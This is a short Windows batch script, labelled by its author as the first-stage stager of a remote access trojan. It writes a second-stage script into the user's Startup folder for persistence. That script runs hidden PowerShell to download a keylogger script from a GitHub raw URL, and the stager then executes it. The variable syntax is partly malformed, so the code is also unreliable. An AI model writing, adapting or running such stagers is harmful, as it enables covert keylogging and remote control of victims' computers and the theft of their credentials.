
@echo off
@REM initial stager for RAT
@REM created by : Luke O'Sullivan

@REM variables
set "initialPath=%cd%"
set "STARTUP=%C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup%"
@REM move into startup directory
cd %STARTUP%
@REM writeS payload to startup
(
    
    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/resources/keylogger.ps1 -OutFile p.ps1"
    echo pause
) > stage2.cmd

@REM run payload placeholder
powershell ./stage2.cmd


cd %initialPath%
@REM del init.cmd
